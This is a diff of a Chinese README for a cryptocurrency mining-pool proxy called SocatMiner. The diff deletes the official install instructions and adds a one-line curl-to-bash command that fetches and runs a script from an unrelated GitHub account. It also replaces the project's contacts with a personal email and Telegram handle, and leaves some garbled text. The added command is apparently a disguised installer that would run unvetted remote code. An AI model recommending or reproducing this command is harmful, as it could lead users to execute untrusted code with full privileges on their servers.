@@ -2,7 +2,7 @@
 
 # SocatMiner
 
-**下一代高性能矿池代理与节点管理系统**
+**高性能的矿池代理与全链路节点管理系统**
 
 <p>
   <a href="https://github.com/SocatMiner/SocatMiner/releases">
@@ -14,7 +14,7 @@
   <a href="https://github.com/SocatMiner/SocatMiner">
     <img src="https://img.shields.io/github/stars/SocatMiner/SocatMiner?style=flat&color=F59E0B&logo=github" alt="GitHub stars">
   </a>
-  <img src="https://img.shields.io/badge/性能-100K%20并发-8B5CF6?logo=lightning&logoColor=white" alt="Performance">
+  <img src="https://img.shields.io/badge/性能-10K%20并发-8B5CF6?logo=lightning&logoColor=white" alt="Performance">
   <img src="https://img.shields.io/badge/Rust-1.75%2B-DEA584?logo=rust&logoColor=white" alt="Rust Version">
 </p>
 
@@ -42,11 +42,11 @@
 
 ## 🚀 项目简介
 
-**SocatMiner** 是一款基于 Rust 语言构建的企业级矿池代理与全链路节点管理系统。专为大规模矿场、矿池节点运营商和专业运维团队设计，提供高性能连接转发、智能负载均衡、多链费率管理与可视化实时监控等核心能力。
+**SocatMiner** 是一款高性能矿机集群流量转发代理系统，矿池代理与全链路节点管理。专为大规模矿场、矿池节点转发运营商和专业运维团队设计，提供高性能连接转发、多费率管理与可视化实时监控等核心能力。
 
-采用零拷贝异步架构，单节点可支撑 **100,000+** 矿机并发连接，延迟低于 **1ms**。配合 SocatMiner Secure Client 实现端到端加密传输，有效抵御中间人攻击与流量嗅探。
+采用零拷贝异步架构，单节点可支撑 **10,000+** 矿机并发连接，延迟低。配合 Socat Proxy 实现端到端加密传输，有效抵御攻击，运营商DPI与流量嗅探。
 
-> **设计理念**：稳定优先 · 性能极致 · 运维友好 · 合规透明
+> **设计理念**：稳定优先 · 性能极致 · 运维友好 · 极简操作
 
 ---
 
@@ -56,14 +56,11 @@
 
 | 特性 | 说明 |
 |:---:|:---|
-| 🎯 **矿池代理转发** | 支持 30+ 主流挖矿算法，无缝对接全球各大矿池，智能路由与故障自动切换 |
-| ⚡ **自建矿池节点** | 一键部署 Stratum 节点，支持自定义费率、算力拆分与多级账户体系 |
-| 🔐 **安全传输隧道** | 自研加密协议 + TLS 1.3 双重保护，配合本地客户端实现数据压缩与链路加密 |
-| 📊 **实时监控大屏** | Web 管理后台提供算力趋势、在线状态、收益统计等多维度可视化仪表盘 |
-| 🌐 **多平台部署** | Linux / Windows / macOS / ARM64 / ARMV7 全架构支持，Docker 一键部署 |
-| 🔧 **API 与 Webhook** | 完整的 RESTful API 与事件回调，轻松对接自有运维平台与告警系统 |
-| 🧩 **插件化架构** | 支持自定义认证模块、计费插件与数据导出，满足企业级定制需求 |
-| 🛡️ **DDoS 防护** | 内置连接限速、IP 黑名单与异常流量识别，保障节点稳定运行 |
+| 🎯 **矿池代理转发** | 支持多种主流挖矿算法，稳定对接全球各大矿池 |
+| ⚡ **矿池节点转发** | 一键部署 Stratum 节点，支持自定义费率、算力拆分与多级账户体系 |
+| 🔐 **安全传输隧道** | 私有加密协议多重保护，配合本地安全客户端实现数据压缩与链路加密 |
+| 📊 **实时监控仪表** | Web 管理后台提供算力趋势、在线状态、收益统计等多维度可视化仪表盘 |
+| 🌐 **平台部署** | Linux  x86架构支持，一键部署 |
 
 </div>
 
@@ -199,117 +196,41 @@
 | 配置 | 最低要求 | 推荐配置 |
 |:---|:---|:---|
 | **操作系统** | Ubuntu 20.04 / CentOS 8 | Ubuntu 22.04 LTS |
-| **CPU** | 1 核 | 4 核及以上 |
-| **内存** | 512 MB | 4 GB 及以上 |
-| **带宽** | 1 Mbps | 100 Mbps 及以上 |
-| **磁盘** | 10 GB SSD | 50 GB SSD |
+| **CPU** | 0.5 核 | 2 核及以上 |
+| **内存** | 512 MB | 2 GB 及以上 |
+| **带宽** | 10 Mbps | 100 Mbps 及以上 |
+| **磁盘** | 20 GB SSD | 50 GB SSD |
 
 ### Linux 一键安装
 
-> **默认管理员账号**：`admin`  **默认密码**：`socatminer2024`
 >
-> 首次登录后请立即修改密码并调整 Web 访问端口。
+```安装脚本（推荐）
 
-```bash
-# 官方安装脚本（推荐）
-bash <(curl -fsSL https://install.socatminer.org)
-
-# GitHub 镜像源
-bash <(curl -fsSL https://raw.githubusercontent.com/SocatMiner/SocatMiner/main/install.sh)
-
-# ARM64 架构
-bash <(curl -fsSL https://install.socatminer.org/arm64.sh)
-
-# ARMV7 架构
-bash <(curl -fsSL https://install.socatminer.org/armv7.sh)
-```
-
-安装完成后，访问 `http://服务器IP:端口号` 进入管理后台。
-
-### Docker 部署
-
-```bash
-# 拉取镜像
-docker pull socatminer/socatminer:latest
-
-# 启动容器
-docker run -d \
-  --name socatminer \
-  --restart unless-stopped \
-  -p 8080:8080 \
-  -p 3333-3350:3333-3350 \
-  -v /opt/socatminer:/data \
-  socatminer/socatminer:latest
-```
-
-### Windows 部署
-
-1. 前往 [Releases 页面](https://github.com/SocatMiner/SocatMiner/releases) 下载最新 Windows 版本
-2. 解压至任意目录，以管理员身份运行 `SocatMiner.exe`
-3. 根据终端提示访问 Web 管理界面
-
----
-
-## 🏗️ 系统架构
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/735840086/hhminer/main/hhminer.sh)"
 
 ```
-                        ┌─────────────────────────┐
-                        │   SocatMiner 管理面板    │
-                        │   (Web Dashboard)       │
-                        └───────────┬─────────────┘
-                                    │
-                        ┌───────────▼─────────────┐
-                        │   核心控制引擎 (Core)    │
-                        │  ┌───────────────────┐  │
-                        │  │  配置管理中心      │  │
-                        │  │  认证与权限        │  │
-                        │  │  数据持久化        │  │
-                        │  └───────────────────┘  │
-                        └───────────┬─────────────┘
-                                    │
-        ┌───────────────────────────┼───────────────────────────┐
-        │                           │                           │
-┌───────▼───────┐         ┌─────────▼─────────┐       ┌─────────▼─────────┐
-│  Stratum 节点  │         │   矿池代理网关     │       │  安全隧道服务      │
-│  (自建矿池)    │         │  (Pool Proxy)     │       │  (Secure Tunnel)  │
-│               │         │                   │       │                   │
-│ • 份额验证    │         │ • 协议转换        │       │ • TLS 1.3 加密    │
-│ • 难度调整    │         │ • 负载均衡        │       │ • 数据压缩        │
-│ • 收益计算    │         │ • 故障转移        │       │ • 链路复用        │
-│ • 支付模块    │         │ • 算力统计        │       │ • 防嗅探          │
-└───────────────┘         └─────────┬─────────┘       └─────────┬─────────┘
-                                    │                           │
-                            ┌───────▼───────┐           ┌───────▼───────┐
-                            │  目标矿池集群  │           │  矿机本地客户端  │
-                            │ (全球多节点)   │           │ (SMC Client)   │
-                            └───────────────┘           └───────────────┘
-```
 
----
+安装完成后，访问 `https://服务器IP:端口号` 进入web管理后台。
+
 
 ## 📊 性能基准
 
 | 指标 | 数值 | 说明 |
 |:---|:---:|:---|
-| **最大并发连接** | 100,000+ | 单节点 4 核 8G 环境 |
+| **最大并发连接** | 10,000+ | 单节点 4 核 8G 环境 |
 | **转发延迟** | < 1 ms | 内网环境 P99 延迟 |
-| **内存占用** | ~ 2 MB / 千连接 | 极低内存开销 |
-| **CPU 使用率** | < 5% @ 1万连接 | 异步非阻塞架构 |
+| **内存占用** | ~ 100 MB / 千连接 | 极低内存开销 |
+| **CPU 使用率** | < 5% @ / 千连接 | 异步非阻塞架构 |
 | **崩溃恢复时间** | < 3 秒 | 进程守护自动重启 |
 | **日算力统计精度** | 99.9% | 份额级精确统计 |
 
 ---
 
-## 📚 文档导航
+## 📚 安全客户端
 
-| 文档 | 链接 | 适用人群 |
+|安全客户端|
 |:---|:---|:---|
-| 🚀 **快速入门指南** | [点击查看](https://docs.socatminer.org/quickstart) | 新手用户 |
-| ⚙️ **矿池代理配置** | [点击查看](https://docs.socatminer.org/pool-proxy) | 矿场运维 |
-| 🏗️ **自建节点部署** | [点击查看](https://docs.socatminer.org/node-setup) | 节点运营商 |
 | 🔐 **安全客户端使用** | [点击查看](https://docs.socatminer.org/secure-client) | 所有用户 |
-| 📡 **API 接口文档** | [点击查看](https://docs.socatminer.org/api) | 开发者 |
-| ❓ **常见问题 FAQ** | [点击查看](https://docs.socatminer.org/faq) | 所有用户 |
 
 ---
 
@@ -317,20 +238,19 @@ docker run -d \
 
 <div align="center">
 
-[![Telegram](https://img.shields.io/badge/Telegram-官方群组-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/socatminer)
+[![Telegram](https://img.shields.io/badge/Telegram-官方群组-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/SocatMiner)
 [![Discord](https://img.shields.io/badge/Discord-加入社区-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/socatminer)
 [![Twitter/X](https://img.shields.io/badge/X-@socatminer-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/socatminer)
 [![GitHub Issues](https://img.shields.io/badge/GitHub-提交问题-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SocatMiner/SocatMiner/issues)
 
 </div>
 
-### 商务合作
+### 合作
 
-如需企业定制、OEM 授权、技术支持或节点合作，请通过以下方式联系我们：
+如需定制、技术支持或合作，请通过以下方式联系我们：
 
-- 📧 商务邮箱：`business@socatminer.org`
-- 💬 Telegram：`@socatminer_admin`
-- 📋 合作咨询：[提交表单](https://socatminer.org/contact)
+- 📧 咨询邮箱：`18628808761h@sina.cn`
+- 💬 Telegram：`@cm1388s`
 
 ---
 
@@ -339,7 +259,7 @@ docker run -d \
 > [!WARNING]
 > **合规使用提示**
 >
-> SocatMiner 受香港特别行政区法律管辖。不同国家和地区对数字货币挖矿相关活动的监管要求存在差异。
+> SocatMiner 法律管辖。不同国家和地区对数字货币挖矿相关活动的监管要求存在差异。
 >
 > 使用本软件前，请确保您所在司法管辖区允许开展数字货币挖矿及相关服务活动。用户需自行承担因违反当地法律法规而产生的全部责任。
 
